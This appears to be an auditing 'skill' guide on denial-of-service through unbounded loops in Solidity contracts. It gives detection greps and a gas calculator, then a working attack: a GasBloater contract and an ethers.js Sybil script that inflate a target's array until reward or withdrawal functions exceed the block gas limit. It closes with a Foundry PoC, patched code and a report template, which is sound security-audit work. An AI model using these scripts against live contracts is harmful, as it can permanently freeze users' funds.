# Skill: Smart Contract — Denial of Service via Unbounded Gas Consumption in Loops

## 0. When to Use This Skill
Use this skill when **all** of the following are true:
- Target is a Solidity smart contract deployed on an EVM-compatible chain (Ethereum, Polygon, BSC, Arbitrum, etc.).
- The contract contains `for` or `while` loops that iterate over dynamic data structures.
- The length of those data structures can grow via public/external function calls.
- You are looking for Denial of Service vectors, griefing attacks, or fund-locking bugs.

**Skip this skill if:** The contract only uses fixed-size arrays, loops are bounded by a constant, or the contract implements a Pull pattern where users claim individually instead of the contract iterating over all users.

---

## 1. Meta-Data
- **Category:** Denial of Service (DoS) / Smart Contract Logic
- **Target Component:** Smart Contracts (Solidity), EVM-compatible chains
- **Complexity:** Medium — requires static analysis of loop patterns and gas cost estimation
- **Estimated CVSS:** 7.5 (High) when critical functions are permanently locked (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
- **Reference:** SWC-128 — DoS With Block Gas Limit, ConsenSys Smart Contract Best Practices

---

## 2. Prerequisites (Trigger Conditions)
- [ ] The smart contract contains a `for` or `while` loop.
- [ ] The loop iterates over a dynamic data structure (array, mapping-backed list, or linked list).
- [ ] The length of that data structure can be increased by users through `public` or `external` functions (e.g., `register()`, `deposit()`, `join()`, `addMember()`).
- [ ] The function containing the loop is critical for contract operation (e.g., distributing rewards, processing withdrawals, updating global state, or triggering settlement).
- [ ] There is no hard cap (`require(array.length < MAX)`) enforced on the data structure size.

---

## 3. Reconnaissance & Detection

### 3.1 Locate Candidate Loops

```bash
# Find all loops that use .length as termination condition
grep -rn "for\s*(.*\.length" --include="*.sol"

# Find while loops (less common but same risk)
grep -rn "while\s*(" --include="*.sol"

# Find loops with state-modifying operations inside (high gas per iteration)
grep -rn -A5 "for\s*(.*\.length" --include="*.sol" | grep -E "\.transfer\(|\.send\(|\.call\{|sstore|delete|push|pop|\[.*\]\s*="
```

### 3.2 Identify Growth Vectors

```bash
# Find functions that grow arrays (.push)
grep -rn "\.push(" --include="*.sol"

# Find public/external functions that add entries
grep -rn "function.*\(.*\)\s*\(public\|external\)" --include="*.sol" | head -50

# Cross-reference: find the array name used in the loop, then search for .push on that array
# Example: if loop uses `investors.length`, search for `investors.push`
grep -rn "investors\.push\|users\.push\|members\.push\|participants\.push" --include="*.sol"
```

### 3.3 Check for Existing Mitigations

```bash
# Look for pagination / batch processing patterns
grep -rn "startIndex\|batchSize\|offset\|limit\|cursor\|PAGE_SIZE" --include="*.sol"

# Look for array size caps
grep -rn "require.*\.length\s*<\|require.*\.length\s*<=" --include="*.sol"

# Look for Pull patterns (individual claim functions)
grep -rn "function\s*\(claim\|withdraw\|harvest\|collect\)" --include="*.sol"
```

### 3.4 Vulnerability Decision Table

| Pattern Found | Gas Risk | Vulnerable? |
|---|---|---|
| Loop over dynamic array + `.push` in public function + no size cap | Unbounded growth → exceeds block gas limit | **YES — High** |
| Loop over dynamic array + `.push` in public function + `require(length < MAX)` with reasonable MAX | Bounded but may still be expensive | **Possible** — depends on MAX and gas per iteration |
| Loop over dynamic array + only admin can grow array (onlyOwner) | Admin-controlled growth | **Low risk** — unless admin is compromised or untrusted |
| Loop with constant bound (`for i < 100`) | Fixed gas cost | **No** |
| No loop — Pull pattern (users call `claim()` individually) | Gas cost per user, not aggregate | **No** |
| Loop over dynamic array + operations are view/pure (no SSTORE) | Low gas per iteration, but still bounded by block gas limit | **Possible** — at very large scale (~100K+ iterations) |

---

## 4. Exploitation Chain (Step-by-Step)

### Step 1 — Identify the Target Function and Array
Read the contract and confirm a public/external function contains a loop that iterates over a user-growable array with no size cap.

```solidity
// VULNERABLE PATTERN — the target
address[] public investorList;

function registerInvestor() external {
    investorList.push(msg.sender);  // Anyone can grow the array
}

function distributeRewards() external {
    for (uint256 i = 0; i < investorList.length; i++) {
        // SSTORE + external call per iteration ≈ 30,000–60,000 gas each
        payable(investorList[i]).transfer(calculateReward(investorList[i]));
    }
}
```

### Step 2 — Estimate the Gas Ceiling
Calculate how many iterations the loop can sustain before hitting the block gas limit.

```python
def estimate_dos_threshold(gas_per_iteration: int, block_gas_limit: int = 30_000_000) -> dict:
    """
    Estimate the number of entries needed to permanently DoS the function.

    Common gas costs per iteration:
    - SSTORE (new slot):     ~20,000 gas
    - SSTORE (existing):      ~5,000 gas
    - SLOAD:                  ~2,100 gas
    - ETH transfer:          ~21,000 gas (+ 2,300 stipend)
    - ERC20 transfer:        ~30,000–65,000 gas
    - Complex computation:    varies
    """
    max_iterations = block_gas_limit // gas_per_iteration
    # Account for ~21,000 base tx cost + function overhead (~50,000)
    effective_limit = (block_gas_limit - 71_000) // gas_per_iteration

    return {
        "block_gas_limit":      block_gas_limit,
        "gas_per_iteration":    gas_per_iteration,
        "max_iterations":       effective_limit,
        "safety_margin_90pct":  int(effective_limit * 0.9),
    }

# Examples:
# ETH transfer loop:   ~30M / 30,000 ≈ 999 entries to DoS
# ERC20 transfer loop:  ~30M / 65,000 ≈ 460 entries to DoS
# SSTORE-heavy loop:    ~30M / 50,000 ≈ 599 entries to DoS
```

### Step 3 — Population (The Bloating Phase)
The attacker repeatedly calls the registration function using multiple accounts or a deployer contract to inflate the array size past the gas ceiling.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerable {
    function registerInvestor() external;
}

contract GasBloater {
    /// @notice Registers `count` entries in a single transaction using CREATE2 proxies.
    function bloat(address target, uint256 count) external {
        for (uint256 i = 0; i < count; i++) {
            // Each call adds one entry to the target's investorList
            IVulnerable(target).registerInvestor();
        }
    }
}
```

```javascript
// Off-chain script variant (ethers.js)
const BATCH_SIZE = 200;
const TOTAL_ENTRIES = 2000; // well above the calculated threshold

for (let batch = 0; batch < TOTAL_ENTRIES / BATCH_SIZE; batch++) {
    const txPromises = [];
    for (let i = 0; i < BATCH_SIZE; i++) {
        const wallet = ethers.Wallet.createRandom().connect(provider);
        // Fund wallet with minimal ETH for gas (or use a relayer)
        txPromises.push(contract.connect(wallet).registerInvestor());
    }
    await Promise.all(txPromises);
    console.log(`Batch ${batch + 1}: registered ${(batch + 1) * BATCH_SIZE} entries`);
}
```

### Step 4 — Trigger the Denial of Service
Once the array exceeds the threshold, any call to the looping function reverts with out-of-gas, regardless of the gas limit specified by the caller.

```javascript
// Verify the DoS condition
try {
    const gasEstimate = await contract.estimateGas.distributeRewards();
    console.log(`Gas estimate: ${gasEstimate}`);
    // If gasEstimate > block gas limit → permanently DoS'd
} catch (error) {
    console.log("[CONFIRMED DoS] Function is un-callable:", error.message);
}
```

### Step 5 — Impact Escalation: Fund Locking
If the DoS'd function is part of a critical state transition (e.g., `distributeRewards` must complete before `withdraw` is unlocked), then all contract funds become permanently frozen.

```
Attack Timeline:
T=0  Contract holds 500 ETH in rewards. distributeRewards() works fine with 100 investors.
T=1  Attacker registers 2,000 Sybil entries via bloat contract.
T=2  investorList.length = 2,100. Gas required ≈ 63M > block gas limit (30M).
T=3  distributeRewards() reverts on every call attempt.
T=4  If withdraw() requires distributeRewards() to have run → funds permanently locked.
T=5  No on-chain recovery path exists unless contract has emergency admin functions.
```

---

## 5. Code Evidence — Vulnerable vs Patched

### Vulnerable (Push Pattern — Unbounded Loop)
```solidity
// VULNERABLE: Iterates over unbounded array with state changes
function distributeRewards() public {
    for (uint256 i = 0; i < investorList.length; i++) {
        payable(investorList[i]).transfer(calculateReward(investorList[i]));
    }
}
```

### Patched (Option A — Pull Pattern)
```solidity
// SAFE: Each user claims their own reward individually
mapping(address => uint256) public pendingRewards;

function claimReward() external {
    uint256 reward = pendingRewards[msg.sender];
    require(reward > 0, "No reward");
    pendingRewards[msg.sender] = 0;
    payable(msg.sender).transfer(reward);
}
```

### Patched (Option B — Paginated / Batched Processing)
```solidity
// SAFE: Process in fixed-size batches
uint256 public lastProcessedIndex;

function distributeRewardsBatch(uint256 batchSize) external {
    uint256 end = lastProcessedIndex + batchSize;
    if (end > investorList.length) {
        end = investorList.length;
    }
    for (uint256 i = lastProcessedIndex; i < end; i++) {
        payable(investorList[i]).transfer(calculateReward(investorList[i]));
    }
    lastProcessedIndex = end;
}
```

### Patched (Option C — Array Size Cap)
```solidity
// SAFE: Hard cap on array growth
uint256 public constant MAX_INVESTORS = 500;

function registerInvestor() external {
    require(investorList.length < MAX_INVESTORS, "Max investors reached");
    investorList.push(msg.sender);
}
```

---

## 6. PoC Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/// @notice Minimal vulnerable contract for PoC
contract VulnerableRewards {
    address[] public investors;

    function register() external {
        investors.push(msg.sender);
    }

    function distributeRewards() external {
        for (uint256 i = 0; i < investors.length; i++) {
            // Simulate reward distribution (SSTORE + transfer)
            payable(investors[i]).transfer(1 wei);
        }
    }

    function investorCount() external view returns (uint256) {
        return investors.length;
    }

    receive() external payable {}
}

contract DoSGasLoopTest is Test {
    VulnerableRewards target;

    function setUp() public {
        target = new VulnerableRewards();
        vm.deal(address(target), 100 ether);
    }

    function test_dosViaBloatedArray() public {
        // Step 1: Populate the array past the safe threshold
        uint256 bloatCount = 1500; // Adjust based on gas-per-iteration estimate
        for (uint256 i = 0; i < bloatCount; i++) {
            address sybil = address(uint160(i + 1));
            vm.prank(sybil);
            target.register();
        }
        assertEq(target.investorCount(), bloatCount);

        // Step 2: Attempt to call distributeRewards with maximum possible gas
        // On mainnet this would exceed the block gas limit
        uint256 gasBefore = gasleft();

        // Estimate gas — if this exceeds ~30M, the function is DoS'd on mainnet
        // In Foundry tests, the gas limit is higher, so we measure instead of expecting revert
        target.distributeRewards();
        uint256 gasUsed = gasBefore - gasleft();

        emit log_named_uint("Investors registered", bloatCount);
        emit log_named_uint("Gas consumed by distributeRewards()", gasUsed);
        emit log_named_uint("Ethereum block gas limit", 30_000_000);

        // Step 3: Assert DoS condition
        // If gasUsed > 30M block gas limit, the function is permanently un-callable on mainnet
        if (gasUsed > 30_000_000) {
            emit log(">>> [VULNERABLE] distributeRewards() exceeds block gas limit — permanent DoS");
        } else {
            emit log(">>> Function still callable, but approaching limit. Increase bloatCount.");
        }
    }
}
```

**Run the PoC:**
```bash
# Using Foundry
forge test --match-test test_dosViaBloatedArray -vvv --gas-limit 100000000

# Using Hardhat (if adapted)
npx hardhat test test/dos-gas-loop.test.js --network hardhat
```

---

## 7. Report Template

### Title
`[High] Denial of Service: Unbounded Gas Consumption in <function_name>() Allows Permanent Function Lockout`

### Summary
The `<function_name>()` function in `<file_path>` iterates over the `<array_name>` array, whose length can be increased without restriction by any user via the `<growth_function>()` function. An attacker can populate this array to a size where the gas required to execute the loop exceeds the block gas limit, permanently preventing the function from executing. If this function is part of a critical state transition (e.g., reward distribution, settlement, or withdrawal processing), all dependent contract funds become permanently locked.

### Impact
- **Permanent DoS:** The affected function becomes un-callable once the array exceeds ~`<threshold>` entries.
- **Fund locking:** If downstream functions depend on the DoS'd function completing, contract funds are permanently frozen.
- **Low attack cost:** Populating the array requires only gas fees for calling `<growth_function>()` repeatedly — no capital at risk for the attacker.

### Severity
**High** — CVSS 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

Escalates to **Critical** if fund locking is confirmed (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H → CVSS 9.1).

### Steps to Reproduce
1. Deploy the contract on a local fork or testnet.
2. Call `<growth_function>()` repeatedly to add `<threshold>` entries to `<array_name>`.
3. Attempt to call `<function_name>()` — observe the transaction reverts with out-of-gas.
4. Verify via `eth_estimateGas` that the required gas exceeds the block gas limit (30M on Ethereum mainnet).
5. Confirm no on-chain recovery mechanism exists (no admin function to reset the array or process in batches).

### Recommended Fix
1. **Preferred:** Replace the Push pattern with a Pull pattern — let users claim individually via a `claim()` function instead of iterating over all users.
2. **Alternative:** Implement paginated/batched processing with a `startIndex` parameter.
3. **Minimum:** Add a hard cap on the array size (`require(array.length < MAX_SIZE)`).

---

## 8. References
- [SWC-128: DoS With Block Gas Limit](https://swcregistry.io/docs/SWC-128)
- [ConsenSys Smart Contract Best Practices — DoS with Block Gas Limit](https://consensys.github.io/smart-contract-best-practices/attacks/denial-of-service/)
- [Solidity by Example — Denial of Service](https://solidity-by-example.org/hacks/denial-of-service/)
- [OpenZeppelin: Pull Payment Pattern](https://docs.openzeppelin.com/contracts/4.x/api/security#PullPayment)
- [Ethereum Yellow Paper — Gas Costs (Appendix G)](https://ethereum.github.io/yellowpaper/paper.pdf)
